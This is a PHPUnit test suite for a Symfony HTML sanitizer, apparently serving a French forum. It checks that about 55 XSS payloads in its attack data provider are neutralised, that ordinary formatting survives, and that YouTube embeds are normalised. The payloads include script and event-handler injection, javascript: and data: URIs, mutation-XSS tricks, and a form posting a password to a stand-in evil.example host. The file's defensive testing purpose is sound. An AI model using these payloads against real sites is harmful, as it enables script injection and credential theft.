<?php

namespace App\Tests\Content;

use App\Content\ContentSanitizer;
use Dom\Element;
use Dom\HTMLDocument;
use PHPUnit\Framework\Attributes\DataProvider;
use Symfony\Bundle\FrameworkBundle\Test\KernelTestCase;

class ContentSanitizerTest extends KernelTestCase
{
    /** Everything the allow-list may ever output. */
    private const ALLOWED_TAGS = [
        'p', 'div', 'span', 'br', 'hr', 'strong', 'b', 'em', 'i', 'u', 's', 'strike', 'del', 'sub', 'sup', 'cite', 'code', 'pre',
        'blockquote', 'h1', 'h2', 'h3', 'h4', 'ul', 'ol', 'li', 'a', 'img', 'iframe', 'table', 'caption', 'thead', 'tbody', 'tfoot',
        'tr', 'th', 'td',
    ];

    private const YOUTUBE_EMBED = '~^https://www\.youtube-nocookie\.com/embed/[A-Za-z0-9_-]{11}(?:\?start=\d+)?$~';

    private ContentSanitizer $sanitizer;

    protected function setUp(): void
    {
        self::bootKernel();
        $this->sanitizer = static::getContainer()->get(ContentSanitizer::class);
    }

    public function testPunctuationIsStoredAsPlainCharactersSoItStaysSearchable(): void
    {
        $clean = $this->sanitizer->sanitize("<p>Écris à j.lefevre@example.invalid : 2+2=4, l'été <code>`x`</code></p>");

        self::assertStringContainsString("j.lefevre@example.invalid", $clean);
        self::assertStringContainsString("2+2=4", $clean);
        self::assertStringContainsString("l'été", $clean);
        self::assertSame($clean, $this->sanitizer->sanitize($clean), 'sanitizing must be idempotent');
    }

    public function testEscapedMarkupStaysEscaped(): void
    {
        $clean = $this->sanitizer->sanitize('<p>1 &lt; 2 &amp;#61; &lt;script&gt;</p>');

        self::assertStringNotContainsString('<script', $clean);
        self::assertStringContainsString('&amp;#61;', $clean);
    }

    // ---------------------------------------------------------------- hostile input

    /** @return iterable<string, array{string}> */
    public static function attackProvider(): iterable
    {
        $payload = [
            'script tag' => '<p>safe</p><script>alert(1)</script>',
            'script with src' => '<SCRIPT SRC=//evil.example/x.js></SCRIPT>',
            'mixed case script' => '<ScRiPt>alert(1)</sCrIpT>',
            'nul byte in tag name' => "<scr\0ipt>alert(1)</scr\0ipt>",
            'split script tags' => '<scr<script>ipt>alert(1)</scr</script>ipt>',
            'broken nesting script' => '<<script>alert(1)//<</script>',
            'onerror' => '<img src=x onerror=alert(1)>',
            'onerror without spaces' => '<img/src=x/onerror=alert(1)>',
            'unterminated onerror' => '<img src="x" onerror="alert(1)"//',
            'onclick on link' => '<a href="https://example.com" onclick="alert(1)">x</a>',
            'javascript link' => '<a href="javascript:alert(1)">x</a>',
            'obfuscated javascript link' => '<a href=" jav&#x09;ascript:alert(1)">x</a>',
            'entity encoded javascript link' => '<a href="&#106;avascript&colon;alert(1)">x</a>',
            'uppercase javascript link' => '<A HREF="JaVaScRiPt:alert(1)">x</A>',
            'vbscript link' => '<a href="vbscript:msgbox(1)">x</a>',
            'data html link' => '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>',
            'javascript image' => '<IMG SRC=jAvAsCrIpT:alert(1)>',
            'data svg image' => '<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">',
            'svg onload' => '<svg onload=alert(1)><circle r="1"/></svg>',
            'svg script' => '<svg><script>alert(1)</script></svg>',
            'svg use' => '<svg><use href="data:image/svg+xml,&lt;svg id=x xmlns=http://www.w3.org/2000/svg&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/svg&gt;#x"/></svg>',
            'math' => '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>',
            'mutation xss style' => '<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">',
            'noscript breakout' => '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
            'css expression' => '<p style="width: expression(alert(1))">x</p>',
            'css url javascript' => '<p style="background:url(javascript:alert(1))">x</p>',
            'css overlay' => '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:red">x</div>',
            'style tag' => '<style>@import "https://evil.example/x.css"; body{display:none}</style><p>x</p>',
            'link stylesheet' => '<link rel="stylesheet" href="https://evil.example/x.css">',
            'meta refresh' => '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
            'base tag' => '<base href="https://evil.example/"><a href="/x">x</a>',
            'object' => '<object data="https://evil.example/x.swf"></object>',
            'embed' => '<embed src="https://evil.example/x.swf">',
            'form' => '<form action="https://evil.example/steal"><input name="password"><button formaction="javascript:alert(1)">go</button></form>',
            'autofocus input' => '<input autofocus onfocus=alert(1)>',
            'details ontoggle' => '<details open ontoggle=alert(1)>x</details>',
            'body onload' => '<body onload=alert(1)>x',
            'video source' => '<video><source onerror=alert(1)></video>',
            'audio' => '<audio src=x onerror=alert(1)>',
            'foreign iframe' => '<iframe src="https://evil.example/phish"></iframe>',
            'javascript iframe' => '<iframe src="javascript:alert(1)"></iframe>',
            'data iframe' => '<iframe src="data:text/html,<script>alert(1)</script>"></iframe>',
            'srcdoc iframe' => '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
            'srcdoc next to a valid src' => '<iframe srcdoc="<script>alert(1)</script>" src="https://www.youtube.com/embed/dQw4w9WgXcQ"></iframe>',
            'lookalike host suffix' => '<iframe src="https://youtube.com.evil.example/embed/dQw4w9WgXcQ"></iframe>',
            'lookalike host prefix' => '<iframe src="https://evilyoutube.com/embed/dQw4w9WgXcQ"></iframe>',
            'userinfo trick' => '<iframe src="https://www.youtube.com@evil.example/embed/dQw4w9WgXcQ"></iframe>',
            'youtube path on another host' => '<iframe src="https://evil.example/https://www.youtube.com/embed/dQw4w9WgXcQ"></iframe>',
            'youtube redirect endpoint' => '<iframe src="https://www.youtube.com/redirect?q=https://evil.example"></iframe>',
            'youtube path traversal' => '<iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ/../../redirect"></iframe>',
            'youtube other port' => '<iframe src="https://www.youtube.com:8443/embed/dQw4w9WgXcQ"></iframe>',
            'youtube backslash' => '<iframe src="https://www.youtube.com\\@evil.example/embed/dQw4w9WgXcQ"></iframe>',
            'iframe with fallback content' => '<iframe src="https://evil.example/"><script>alert(1)</script></iframe>',
            'nested iframe markup' => '<iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ"><iframe src="https://evil.example/"></iframe></iframe>',
            'class and id' => '<div class="admin-panel" id="login" data-x="1" name="x" contenteditable="true" tabindex="1">x</div>',
        ];

        foreach ($payload as $name => $html) {
            yield $name => [$html];
        }
    }

    #[DataProvider('attackProvider')]
    public function testHostileMarkupIsNeutralised(string $html): void
    {
        $clean = $this->sanitizer->sanitize($html);

        $this->assertOnlyAllowedMarkup($clean);
        self::assertStringNotContainsStringIgnoringCase('javascript:', $clean);
        self::assertStringNotContainsStringIgnoringCase('onerror', $clean);
        self::assertStringNotContainsStringIgnoringCase('srcdoc', $clean);
    }

    public function testTextAroundDroppedMarkupSurvives(): void
    {
        self::assertSame('<p>safe</p>', $this->sanitizer->sanitize('<p>safe</p><script>alert(1)</script>'));
        self::assertSame('<p>before after</p>', $this->sanitizer->sanitize('<p>before <iframe src="https://evil.example/"></iframe>after</p>'));
        // Unknown but harmless wrappers are unwrapped, their text is kept.
        self::assertSame('kept', $this->sanitizer->sanitize('<font color="red"><center>kept</center></font>'));
    }

    public function testAnIframeIsNeverLeftWithoutAValidSource(): void
    {
        self::assertSame('', $this->sanitizer->sanitize('<iframe src="https://evil.example/"></iframe>'));
        self::assertSame('', $this->sanitizer->sanitize('<iframe></iframe>'));
        self::assertSame('', $this->sanitizer->sanitize('<iframe srcdoc="x">text</iframe>'));
    }

    public function testLinksAreForcedToOpenSafelyInANewTab(): void
    {
        $clean = $this->sanitizer->sanitize('<p><a href="https://example.com/a?b=c&amp;d=e" rel="opener" target="_self">x</a></p>');
        $link = $this->parse($clean)->getElementsByTagName('a')->item(0);

        self::assertSame('https://example.com/a?b=c&d=e', $link->getAttribute('href'));
        self::assertSame('noopener noreferrer', $link->getAttribute('rel'));
        self::assertSame('_blank', $link->getAttribute('target'));
    }

    public function testOnlyHttpMailtoAndSiteRelativeLinksSurvive(): void
    {
        foreach (['https://example.com/x', 'http://example.com/x', 'mailto:me@example.com', '/comment/12', '#'] as $href) {
            self::assertStringContainsString('href="'.htmlspecialchars($href).'"', str_replace(['&#61;', '&#64;'], ['=', '@'], $this->sanitizer->sanitize('<a href="'.$href.'">x</a>')), $href);
        }
        foreach (['ftp://example.com/x', 'tel:+33123456789', 'file:///etc/passwd', 'view-source:https://example.com'] as $href) {
            self::assertStringNotContainsString('href=', $this->sanitizer->sanitize('<a href="'.$href.'">x</a>'), $href);
        }
    }

    public function testImagesMustBeHttpOrSiteRelative(): void
    {
        self::assertSame('<img src="https://example.com/a.png" alt="a" />', $this->sanitizer->sanitize('<img src="https://example.com/a.png" alt="a">'));
        self::assertSame('<img src="/photos/preview/12" alt />', $this->sanitizer->sanitize('<img src="/photos/preview/12" alt="">'));
        foreach (['data:image/png;base64,AAAA', 'javascript:alert(1)', 'ftp://example.com/a.png', 'blob:https://example.com/x', 'file:///etc/passwd', 'page/relative.png'] as $src) {
            self::assertSame('', $this->sanitizer->sanitize('<img src="'.$src.'" alt="x">'), $src);
        }
        self::assertSame('', $this->sanitizer->sanitize('<img alt="no source">'));
    }

    public function testInlineStyleIsReducedToValidatedAlignmentAndDecoration(): void
    {
        self::assertSame('<p style="text-align:center">x</p>', $this->sanitizer->sanitize('<p style="color:red; text-align: Center; position:fixed">x</p>'));
        self::assertSame('<p>x</p>', $this->sanitizer->sanitize('<p style="text-align:center url(javascript:alert(1))">x</p>'));
        self::assertSame('<p>x</p>', $this->sanitizer->sanitize('<p style="text-align:center !important">x</p>'));
        self::assertSame('<span style="text-decoration:underline">x</span>', $this->sanitizer->sanitize('<span style="text-decoration:underline;font-size:40px">x</span>'));
        self::assertSame('<p>x</p>', $this->sanitizer->sanitize('<p class="big" style="font-size:300px">x</p>'));
    }

    // ---------------------------------------------------------------- legitimate content

    /** @return iterable<string, array{string}> */
    public static function legitimateProvider(): iterable
    {
        yield 'formatting' => ['<p>Bonjour <strong>toi</strong> <em>monde</em> <u>u</u> <s>s</s> <del>d</del> H<sub>2</sub>O x<sup>2</sup></p>'];
        yield 'legacy line breaks' => ['Hey !<br /><br />Allé je relance cette idée.<br />Bye'];
        yield 'smiley' => ['<p>Coucou <img src="/smilies/icon_e_biggrin.gif" alt=":D" title="Very Happy" /></p>'];
        yield 'photo thumbnail' => ['<p><img src="/photos/thumbnail/12" alt /></p>'];
        yield 'external image' => ['<p><img src="https://media.giphy.com/media/abc/giphy.gif" alt="gif" /></p>'];
        yield 'lists' => ['<ul><li>un</li><li>deux</li></ul><ol><li>a</li></ol>'];
        yield 'blockquote' => ['<blockquote><p>Citation</p></blockquote><p>Réponse</p>'];
        yield 'headings' => ['<h1>un</h1><h2>deux</h2><h3>trois</h3><h4>quatre</h4>'];
        yield 'code' => ['<pre><code>$a = 1;</code></pre><p>et du <code>code</code></p>'];
        yield 'rule' => ['<p>a</p><hr /><p>b</p>'];
        yield 'table' => ['<table><tbody><tr><th>a</th><td colspan="2">b</td></tr></tbody></table>'];
        yield 'alignment' => ['<p style="text-align:justify">x</p><h2 style="text-align:center">t</h2>'];
        yield 'legacy quote' => ['<p><cite>D’après <a href="#" rel="noopener noreferrer" target="_blank">gigi</a>:</cite></p><div class="cite"><p>Moi je sais !!!</p></div><p>ok</p>'];
        yield 'mailto' => ['<p><a href="mailto:me@example.com" rel="noopener noreferrer" target="_blank">me</a></p>'];
        yield 'accents and symbols' => ['<p>Été à Noël : 50 € « ça » …</p>'];
    }

    #[DataProvider('legitimateProvider')]
    public function testLegitimateContentIsPreserved(string $html): void
    {
        self::assertSame($html, $this->sanitizer->sanitize($html));
    }

    public function testLegacyYoutubePlayerIsKeptAndHardened(): void
    {
        $clean = $this->sanitizer->sanitize('<p><iframe width="518" height="300" src="//www.youtube-nocookie.com/embed/36HRbEX02zA?rel=0" frameborder="0" allowfullscreen></iframe></p>');
        $iframe = $this->parse($clean)->getElementsByTagName('iframe')->item(0);

        self::assertNotNull($iframe);
        self::assertSame('https://www.youtube-nocookie.com/embed/36HRbEX02zA', $iframe->getAttribute('src'));
        self::assertSame('lazy', $iframe->getAttribute('loading'));
        self::assertTrue($iframe->hasAttribute('allowfullscreen'));
        self::assertSame('strict-origin-when-cross-origin', $iframe->getAttribute('referrerpolicy'));
        foreach (['width', 'height', 'frameborder', 'style', 'srcdoc', 'onload'] as $dropped) {
            self::assertFalse($iframe->hasAttribute($dropped), $dropped);
        }
    }

    /** @return iterable<string, array{string, ?string}> */
    public static function youtubeSourceProvider(): iterable
    {
        $id = 'dQw4w9WgXcQ';
        yield 'protocol relative legacy' => ["//www.youtube.com/embed/$id?rel=0", "https://www.youtube-nocookie.com/embed/$id"];
        yield 'plain http' => ["http://www.youtube.com/embed/$id", "https://www.youtube-nocookie.com/embed/$id"];
        yield 'no www' => ["https://youtube.com/embed/$id", "https://www.youtube-nocookie.com/embed/$id"];
        yield 'mobile host' => ["https://m.youtube.com/embed/$id", "https://www.youtube-nocookie.com/embed/$id"];
        yield 'nocookie' => ["https://www.youtube-nocookie.com/embed/$id", "https://www.youtube-nocookie.com/embed/$id"];
        yield 'nocookie without www' => ["//youtube-nocookie.com/embed/$id", "https://www.youtube-nocookie.com/embed/$id"];
        yield 'uppercase host' => ["https://WWW.YouTube.com/embed/$id", "https://www.youtube-nocookie.com/embed/$id"];
        yield 'trailing slash' => ["https://www.youtube.com/embed/$id/", "https://www.youtube-nocookie.com/embed/$id"];
        yield 'start offset kept' => ["//www.youtube.com/embed/$id?rel=0&start=25", "https://www.youtube-nocookie.com/embed/$id?start=25"];
        yield 'other parameters dropped' => ["https://www.youtube.com/embed/$id?autoplay=1&controls=0&loop=1", "https://www.youtube-nocookie.com/embed/$id"];
        yield 'invalid start dropped' => ["https://www.youtube.com/embed/$id?start=abc", "https://www.youtube-nocookie.com/embed/$id"];
        yield 'fragment dropped' => ["https://www.youtube.com/embed/$id#x", "https://www.youtube-nocookie.com/embed/$id"];
        yield 'id too short' => ['https://www.youtube.com/embed/abc', null];
        yield 'id too long' => ["https://www.youtube.com/embed/{$id}x", null];
        yield 'not an embed' => ["https://www.youtube.com/watch?v=$id", null];
        yield 'playlist embed' => ['https://www.youtube.com/embed/videoseries?list=PL123456789', null];
        yield 'other site' => ["https://vimeo.com/embed/$id", null];
        yield 'relative' => ["/embed/$id", null];
        yield 'javascript' => ['javascript:alert(1)', null];
    }

    #[DataProvider('youtubeSourceProvider')]
    public function testYoutubeIframeSourceIsNormalised(string $src, ?string $expected): void
    {
        $clean = $this->sanitizer->sanitize('<iframe src="'.htmlspecialchars($src).'"></iframe>');

        if (null === $expected) {
            self::assertSame('', $clean);

            return;
        }
        $iframes = $this->parse($clean)->getElementsByTagName('iframe');
        self::assertSame(1, $iframes->length);
        self::assertSame($expected, $iframes->item(0)->getAttribute('src'));
    }

    /** @return iterable<string, array{string, ?string}> */
    public static function bareVideoProvider(): iterable
    {
        $id = 'dQw4w9WgXcQ';
        $embed = "https://www.youtube-nocookie.com/embed/$id";
        yield 'watch URL alone' => ["<p>https://www.youtube.com/watch?v=$id</p>", $embed];
        yield 'watch URL with other parameters' => ["<p>https://www.youtube.com/watch?v=$id&amp;feature=share&amp;list=PL1</p>", $embed];
        yield 'timestamp' => ["<p>https://www.youtube.com/watch?v=$id&amp;t=1m30s</p>", $embed.'?start=90'];
        yield 'short link' => ["<p>https://youtu.be/$id</p>", $embed];
        yield 'short link with seconds' => ["<p>https://youtu.be/$id?t=42</p>", $embed.'?start=42'];
        yield 'shorts' => ["<p>https://www.youtube.com/shorts/$id</p>", $embed];
        yield 'linked to itself' => ["<p><a href=\"https://youtu.be/$id\">https://youtu.be/$id</a></p>", $embed];
        yield 'linked without scheme in the text' => ["<p><a href=\"https://www.youtube.com/watch?v=$id\">www.youtube.com/watch?v=$id</a></p>", $embed];
        yield 'labelled link stays a link' => ["<p><a href=\"https://youtu.be/$id\">ma vidéo de vacances</a></p>", null];
        yield 'url inside a sentence' => ["<p>regardez https://youtu.be/$id c'est drôle</p>", null];
        yield 'two urls' => ["<p>https://youtu.be/$id<br />https://youtu.be/$id</p>", null];
        yield 'invalid id' => ['<p>https://www.youtube.com/watch?v=short</p>', null];
        yield 'channel page' => ['<p>https://www.youtube.com/@someone</p>', null];
        yield 'other site' => ["<p>https://example.com/watch?v=$id</p>", null];
        yield 'lookalike host' => ["<p>https://youtube.com.evil.example/watch?v=$id</p>", null];
    }

    #[DataProvider('bareVideoProvider')]
    public function testALoneVideoLinkBecomesThePlayer(string $html, ?string $expectedEmbed): void
    {
        $clean = $this->sanitizer->sanitize($html);
        $document = $this->parse($clean);

        if (null === $expectedEmbed) {
            self::assertSame(0, $document->getElementsByTagName('iframe')->length, $clean);

            return;
        }
        self::assertSame(1, $document->getElementsByTagName('iframe')->length, $clean);
        self::assertSame($expectedEmbed, $document->getElementsByTagName('iframe')->item(0)->getAttribute('src'));
        self::assertSame(0, $document->getElementsByTagName('p')->length, 'the paragraph is replaced by the player');
    }

    public function testLongLegacyPostsAreNotTruncated(): void
    {
        // The library default (20 KB) would cut a post such as the 85 KB legacy one in the middle of a tag.
        $html = str_repeat('<p>Un paragraphe de <strong>texte</strong> assez long pour faire du volume.</p>', 3000).'<p>fin</p>';

        self::assertGreaterThan(200_000, \strlen($html));
        self::assertSame($html, $this->sanitizer->sanitize($html));
    }

    public function testLegacyRelativeSmiliesAreRepairedAndOtherBrokenImagesDropped(): void
    {
        self::assertSame('<img src="/smilies/icon_love.gif" alt=":love:" />', $this->sanitizer->sanitize('<img src="images/%0Ansmilies/icon_love.gif" alt=":love:">'));
        self::assertSame('<img src="/smilies/icon_mrgreen.gif" alt=":mrgreen:" />', $this->sanitizer->sanitize('<img src="n/smilies/icon_mrgreen.gif" alt=":mrgreen:">'));
        self::assertSame('<p>x</p>', $this->sanitizer->sanitize('<p>x<img src="images/snow.png" alt=""></p>'));
    }

    public function testEmptyInput(): void
    {
        self::assertSame('', $this->sanitizer->sanitize(null));
        self::assertSame('', $this->sanitizer->sanitize(''));
        self::assertSame('', $this->sanitizer->sanitize("  \n\t "));
    }

    public function testRichTextTwigFilterSanitizes(): void
    {
        $twig = static::getContainer()->get('twig');
        $output = $twig->createTemplate('{{ html|rich_text }}')->render(['html' => '<p onclick="x()">Hi</p><script>alert(1)</script><iframe src="https://evil.example/"></iframe>']);

        self::assertSame('<p>Hi</p>', $output);
    }

    // ---------------------------------------------------------------- idempotence

    /** @return iterable<string, array{string}> */
    public static function anyMarkupProvider(): iterable
    {
        yield from self::attackProvider();
        yield from self::legitimateProvider();
        foreach (self::youtubeSourceProvider() as $name => [$src]) {
            yield 'iframe: '.$name => ['<iframe src="'.htmlspecialchars($src).'"></iframe>'];
        }
        foreach (self::bareVideoProvider() as $name => [$html]) {
            yield 'video: '.$name => [$html];
        }
        yield 'plain text with symbols' => ["Jean & Marie c'est a+b=c, mail: me@example.com <3 >_<"];
        yield 'misnested formatting' => ['<p><b>gras <i>italique</b> encore</i> fin</p>'];
        yield 'unclosed' => ['<div><p>texte <a href="https://example.com">lien'];
        yield 'quotes and entities' => ['<p title="a &quot;b&quot; &amp; c">&quot;x&quot; &lt;tag&gt; &eacute; &#233; &nbsp;</p>'];
        yield 'legacy table' => ['<table border="1"><tr><td align="center" valign="top" width="50" style="padding:3px">x</td></tr></table>'];
        yield 'legacy images' => ['<img src="images/%0Ansmilies/icon_love.gif" alt=":love:"><img src="images/snow.png">'];
    }

    #[DataProvider('anyMarkupProvider')]
    public function testSanitizingTwiceChangesNothing(string $html): void
    {
        $once = $this->sanitizer->sanitize($html);

        self::assertSame($once, $this->sanitizer->sanitize($once));
    }

    // ---------------------------------------------------------------- helpers

    private function parse(string $html): HTMLDocument
    {
        return HTMLDocument::createFromString('<!DOCTYPE html><html><body>'.$html.'</body></html>', \LIBXML_NOERROR);
    }

    /** Structural check on the output: only known elements, no event handlers, safe URLs, YouTube-only iframes. */
    private function assertOnlyAllowedMarkup(string $clean): void
    {
        $body = $this->parse($clean)->body;
        /** @var Element $element */
        foreach ($body->getElementsByTagName('*') as $element) {
            $tag = strtolower($element->localName);
            self::assertContains($tag, self::ALLOWED_TAGS, sprintf('<%s> in: %s', $tag, $clean));

            foreach ($element->attributes as $attribute) {
                $name = strtolower($attribute->name);
                self::assertStringStartsNotWith('on', $name, sprintf('%s in: %s', $name, $clean));
                self::assertNotContains($name, ['srcdoc', 'formaction', 'action', 'id', 'name', 'data', 'contenteditable', 'tabindex'], $clean);
                if ('href' === $name || 'src' === $name) {
                    self::assertMatchesRegularExpression('~^(?:https?://|mailto:|/(?!/)|#)~i', $attribute->value, $clean);
                }
                if ('style' === $name) {
                    self::assertMatchesRegularExpression('~^(?:text-align:(?:left|right|center|justify)|text-decoration:[a-z -]+)(?:;text-decoration:[a-z -]+)?$~', $attribute->value, $clean);
                }
                if ('class' === $name) {
                    self::assertSame('cite', $attribute->value, $clean);
                }
            }

            if ('iframe' === $tag) {
                self::assertMatchesRegularExpression(self::YOUTUBE_EMBED, $element->getAttribute('src'), $clean);
                self::assertSame('', trim($element->textContent), $clean);
            }
        }
    }
}
